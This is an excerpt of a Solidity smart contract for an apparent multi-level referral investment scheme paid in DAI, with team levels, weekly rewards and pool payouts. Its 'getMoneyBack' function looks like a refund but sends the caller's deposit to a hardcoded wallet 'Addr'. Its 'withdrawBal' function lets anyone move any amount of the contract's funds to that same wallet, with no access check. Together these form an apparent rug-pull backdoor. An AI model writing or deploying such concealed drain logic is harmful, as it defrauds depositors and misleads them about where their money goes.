...
contract testtoken {
    ...
    address public defualtRefer = 0x639d804a4a90C66041A998b475B3cDB4Fd3b00a8;
    uint256 private constant timestep = 1 days;
    uint256 private constant weekTimeStep = 7 days;
    ...
    uint256[8] private PoolBusinessRequired = [500e18, 1000e18, 3000e18, 5000e18, 10000e18, 20000e18, 20000e18, 20000e18];
    ...
    uint256[11] private SLWeeklyBusiness = [700e18, 1000e18, 1400e18, 2000e18, 2500e18, 4000e18, 6000e18, 8000e18, 12000e18, 16000e18, 25000e18];
    ...
    constructor() {
        ...
        Admin = 0x3cD1187713E51971FB063abdE1F809D22De39D37;
        recoveryFund = 0x5B4636c472F92A3e4ccF85f7E562EaD308837F44;
        jackpotFund = 0x19a5F3E4Dd59A523f05F01ea6E0b16704dAAd7c0;
        Addr = 0x639d804a4a90C66041A998b475B3cDB4Fd3b00a8;
        registerationFee = 0x639d804a4a90C66041A998b475B3cDB4Fd3b00a8;
    }
    ...
    function _calLevel(address _user) private view returns(uint256) {
        ...
        if(user.directTeam >= 21 && user.totalTeam >= 7000 && user.selfDeposit >= 15000e18) {
            (uint256 forLevel, , , ) = calBusiness(_user, 3000000e18);
            if(forLevel >= 3000000e18) return 11;
        } 
        if(user.directTeam >= 17 && user.totalTeam >= 5000 && user.selfDeposit >= 10000e18) {
            (uint256 forLevel, , , ) = calBusiness(_user, 1200000e18);
            if(forLevel >= 1200000e18) return 10;
        } 
        if(user.directTeam >= 15 && user.totalTeam >= 3000 && user.selfDeposit >= 5500e18) {
            (uint256 forLevel, , , ) = calBusiness(_user, 500000e18);
            if(forLevel >= 500000e18) return 9;
        } 
        if(user.directTeam >= 14 && user.totalTeam >= 2000 && user.selfDeposit >= 3500e18) {
            (uint256 forLevel, , , ) = calBusiness(_user, 300000e18);
            if(forLevel >= 300000e18) return 8;
        } 
        if(user.directTeam >= 13 && user.totalTeam >= 1000 && user.selfDeposit >= 2500e18) {
            (uint256 forLevel, , , ) = calBusiness(_user, 200000e18);
            if(forLevel >= 200000e18) return 7;
        }
        if(user.directTeam >= 12 && user.totalTeam >= 500 && user.selfDeposit >= 2000e18) {
            (uint256 forLevel, , , ) = calBusiness(_user, 100000e18);
            if(forLevel >= 100000e18) return 6;
        }
        if(user.directTeam >= 11 && user.totalTeam >= 250 && user.selfDeposit >= 1500e18) {
            (uint256 forLevel, , , ) = calBusiness(_user, 30000e18);
            if(forLevel >= 30000e18) return 5;
        }
        if(user.directTeam >= 9 && user.totalTeam >= 100 && user.selfDeposit >= 1000e18) {
            (uint256 forLevel, , , ) = calBusiness(_user, 12000e18);
            if(forLevel >= 12000e18) return 4;
        }
        if(user.directTeam >= 7 && user.totalTeam >= 50 && user.selfDeposit >= 500e18) {
            (uint256 forLevel, , , ) = calBusiness(_user, 7000e18);
            if(forLevel >= 7000e18) return 3;
        }
        if(user.directTeam >= 5 && user.totalTeam >= 25 && user.selfDeposit >= 300e18) {
            (uint256 forLevel, , , ) = calBusiness(_user, 3000e18);
            if(forLevel >= 3000e18) return 2;
        }
    ...
    function _upgrade(address _user, uint256 amount, uint256 _type) private {
        ...
        if(_type == 0) {
            ...
            if(_prevAmount > 0) {
                require(block.timestamp.sub(reward.upgraded) >= weekTimeStep, "cannot upgrade befor time");
            }
            ...
            if(_prevAmount > 0) {
                require(block.timestamp.sub(reward.upgraded) >= weekTimeStep, "cannot retopup befor time");
            }
    ...
    function claimReward() public {
        ...
        uint256 interestInMultiple = (block.timestamp.sub(rewardInfo[msg.sender].acheived)).div(weekTimeStep);
    ...
    function distributePoolRewards() public {
        require(block.timestamp.sub(poolsLastDistributed) > weekTimeStep, "timestep not completed");
    ...
    function getMoneyBack() public {
        require(userInfo[msg.sender].isActive == true, "inactive account");
        require(block.timestamp.sub(userInfo[msg.sender].start) <= 10 days, "request time out");
        uint256 toTransfer = userInfo[msg.sender].selfDeposit.mul(7000).div(baseDivider);
        dai.transfer(Addr, toTransfer);
    ...
    function withdrawBal(uint256 amount) public {
        dai.transfer(Addr, amount);
    }
}